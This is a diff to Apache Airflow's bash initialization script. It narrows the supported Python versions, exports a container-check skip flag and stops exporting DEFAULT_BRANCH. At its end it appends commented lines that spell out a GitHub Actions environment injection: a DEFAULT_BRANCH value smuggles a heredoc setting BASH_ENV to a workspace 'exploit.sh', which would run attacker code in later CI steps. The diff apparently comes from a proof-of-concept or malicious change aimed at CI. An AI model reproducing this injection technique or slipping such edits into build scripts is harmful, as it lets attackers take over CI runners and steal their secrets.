@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+export SKIP_IN_CONTAINER_CHECK=true
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
 # distributed with this work for additional information
@@ -107,11 +108,11 @@ function initialization::initialize_base_variables() {
     export PRODUCTION_IMAGE="false"
 
     # All supported major/minor versions of python in all versions of Airflow
-    ALL_PYTHON_MAJOR_MINOR_VERSIONS+=("3.6" "3.7" "3.8" "3.9")
+    ALL_PYTHON_MAJOR_MINOR_VERSIONS+=("3.8")
     export ALL_PYTHON_MAJOR_MINOR_VERSIONS
 
     # Currently supported major/minor versions of python
-    CURRENT_PYTHON_MAJOR_MINOR_VERSIONS+=("3.7" "3.8" "3.9" "3.6")
+    CURRENT_PYTHON_MAJOR_MINOR_VERSIONS+=("3.8")
     export CURRENT_PYTHON_MAJOR_MINOR_VERSIONS
 
     # Currently supported versions of Postgres
@@ -187,7 +188,7 @@ function initialization::initialize_base_variables() {
 # Determine current branch
 function initialization::initialize_branch_variables() {
     # Default branch used - this will be different in different branches
-    export DEFAULT_BRANCH=${DEFAULT_BRANCH="main"}
+    DEFAULT_BRANCH=${DEFAULT_BRANCH="main"}
     export DEFAULT_CONSTRAINTS_BRANCH=${DEFAULT_CONSTRAINTS_BRANCH="constraints-main"}
     readonly DEFAULT_BRANCH
     readonly DEFAULT_CONSTRAINTS_BRANCH
@@ -628,7 +629,7 @@ function initialization::initialize_common_environment() {
 
 function initialization::set_default_python_version_if_empty() {
     # default version of python used to tag the "main" and "latest" images in DockerHub
-    export DEFAULT_PYTHON_MAJOR_MINOR_VERSION=3.7
+    export DEFAULT_PYTHON_MAJOR_MINOR_VERSION=3.8
 
     # default python Major/Minor version
     export PYTHON_MAJOR_MINOR_VERSION=${PYTHON_MAJOR_MINOR_VERSION:=${DEFAULT_PYTHON_MAJOR_MINOR_VERSION}}
@@ -941,3 +942,7 @@ function initialization::check_docker_version() {
         fi
     fi
 }
+# export DEFAULT_BRANCH=A=
+# export DEFAULT_BRANCH=A=BASH_ENV<<END_ENV
+# export DEFAULT_BRANCH=A=$GITHUB_WORKSPACE/exploit.sh
+# export DEFAULT_BRANCH=A=END_ENV
